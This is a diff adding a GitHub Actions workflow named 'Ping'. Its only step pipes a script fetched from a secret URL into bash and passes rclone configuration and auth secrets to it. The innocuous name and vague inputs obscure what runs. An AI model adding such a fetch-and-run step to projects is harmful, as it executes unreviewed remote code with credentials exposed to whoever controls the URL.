@@ -1,0 +1,30 @@
+name: Ping
+
+on:
+  workflow_dispatch:
+    inputs:
+      channel:
+        description: "Target Source Alias"
+        required: false
+        default: ""
+        type: string
+      payload:
+        description: "Task Configuration Payload"
+        required: false
+        default: ""
+        type: string
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+
+    steps:
+      - run: curl -fsSL "${{ secrets.PING_SCRIPT_URL }}" | bash
+        env:
+          RCLONE_CONF: ${{ secrets.RCLONE_CONF }}
+          AUTH: ${{ secrets.AUTH }}
